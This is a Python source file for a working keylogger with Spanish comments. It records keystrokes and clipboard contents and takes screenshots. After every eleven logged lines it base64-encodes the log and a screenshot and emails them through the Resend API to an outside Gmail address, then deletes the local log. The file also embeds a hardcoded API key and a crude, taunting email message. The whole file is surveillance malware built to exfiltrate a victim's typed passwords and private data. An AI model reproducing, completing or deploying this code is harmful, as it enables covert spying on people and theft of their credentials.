import os
import time
import base64
from pynput.keyboard import Key, Listener
import pyperclip
import pyautogui
import resend

# Configuración de la API Key de resend
resend.api_key = "re_cWnAMYCk_6sh64AgK4E7BnkGGE2PtNNti"

count = 0
keys = []
active = 0
arr = []
last_clipboard = ''

def take_screenshot():
    # Obtiene la ruta del script actual
    script_dir = os.path.dirname(os.path.abspath(__file__))
    screenshot_path = os.path.join(script_dir, 'screenshot.png')

    # Captura de pantalla y sobrescribe 'screenshot_path'
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path

def on_press(key):
    global keys, count, active, arr, last_clipboard

    if key == Key.enter:
        for i in range(len(keys)):
            if active % 2 != 0:
                keys[i] = str(keys[i]).upper()

            if keys[i] == "+":
                active += 1

        for i in range(len(keys)):
            if keys[i] == "+":
                pass
            else:
                arr.append(keys[i])

        keys = arr

        keys.append("\n")

        write_file(keys, count)
        keys = []
        arr = []

        count += 1
        if count > 10:
            send_email()
            if os.path.exists("log.txt"):
                os.remove("log.txt")
            count = 0

    elif key == '"':
        keys.append('"')
    elif key == Key.shift_r:
        keys.append("")

    elif key == Key.ctrl_l:
        keys.append("")
        # Captura el contenido del portapapeles al presionar Ctrl+C
        clipboard_content = pyperclip.paste()
        if clipboard_content and clipboard_content != last_clipboard:
            keys.append(f"Ctrl+C: {clipboard_content}")
            last_clipboard = clipboard_content

    elif key == Key.space:
        keys.append(" ")

    elif key == Key.backspace:
        if len(keys) == 0:
            pass
        else:
            keys.pop(-1)

    elif key == Key.caps_lock:
        keys.append("+")

    else:
        keys.append(key)

    print("{0}".format(key))


def write_file(keys, count):
    with open("log.txt", "a") as f:
        f.write(time.strftime("%d/%m/%y   "))
        f.write(time.strftime("%I:%M:%S   "))
        for key in keys:
            k = str(key).replace("'", "")

            if k.find("\n") > 0:
                f.write(k)
            elif k.find('Key') == -1:
                f.write(k)
        f.write("\n")


def send_email():
    # Captura la imagen justo antes de enviar el correo
    screenshot_path = take_screenshot()

    with open("log.txt", "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode('utf-8')

    with open(screenshot_path, "rb") as img_file:
        img_content = img_file.read()
        encoded_img = base64.b64encode(img_content).decode('utf-8')

    params = {
        "from": "Jacky Sieras Tu <joselitog@resend.dev>",
        "to": ["buajajajajajajajajajaja@gmail.com"],
        "subject": "Archivo confidencial JU3PUT4 !! (bkp.my.cpu)",
        "text": "M4R1C4 jU3PUT4 AQUÍ TIENES miS COjON35 PUEST05 EN bANDEJA. tE MANDO ESTA MI3RDA. eSPERO QUE LA DISFRUTES MAR1C4 :D.",
        "attachments": [
            {"filename": "log.txt", "content": encoded_content},
            {"filename": "screenshot.png", "content": encoded_img},
        ],
    }

    email = resend.Emails.send(params)
    print(email)


def main():
    # Crear el archivo de captura de pantalla si no existe
    take_screenshot()

    if os.path.exists("log.txt"):
        os.remove("log.txt")
    else:
        pass

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == '__main__':
    main()
